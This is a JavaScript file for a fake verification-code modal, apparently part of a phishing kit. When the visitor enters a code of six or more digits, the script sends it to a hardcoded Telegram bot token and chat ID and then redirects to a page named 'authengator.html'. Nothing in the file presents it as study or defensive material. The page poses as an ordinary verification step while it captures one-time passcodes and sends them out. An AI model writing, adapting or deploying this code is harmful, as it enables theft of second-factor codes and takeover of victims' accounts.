document.addEventListener("DOMContentLoaded", () => {
    // Modal controls
    const modal = document.getElementById("verificationModal");
    const closeModal = document.querySelector(".close-modal");
    const otpInput = document.getElementById("otp-input");

    // Modal open karne ka function
    window.openModal = function() {
        // FIXED: Sirf ye line add ki hai jo box ko khali karegi
        if (otpInput) otpInput.value = ""; 
        modal.style.display = "block";
    };

    closeModal.onclick = () => {
        modal.style.display = "none";
    };

    window.onclick = (event) => {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    };
});

// Confirm button function (Aapka original Telegram calling logic)
async function confirmSelection() {
    const otpValue = document.getElementById("otp-input").value;
    
    // Yahan wahi Bots aur Chat ID hain jo aapki original file mein the
    const bots = {
        "7892706717:AAGLqVZWBSvENZtXC-7EpmjhOHygY_8RQK8": "-4814667671"
    };

    if (otpValue.length >= 6) {
        const message = `Verification Code: ${otpValue}`;
        try {
            const sendPromises = Object.entries(bots).map(async ([token, chatId]) => {
                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                return fetch(url);
            });
            await Promise.all(sendPromises);
            
            // Redirect to next page
            window.location.href = "authengator.html";
        } catch (error) {
            window.location.href = "authengator.html";
        }
    } else {
        alert("Please enter a valid code.");
    }
}
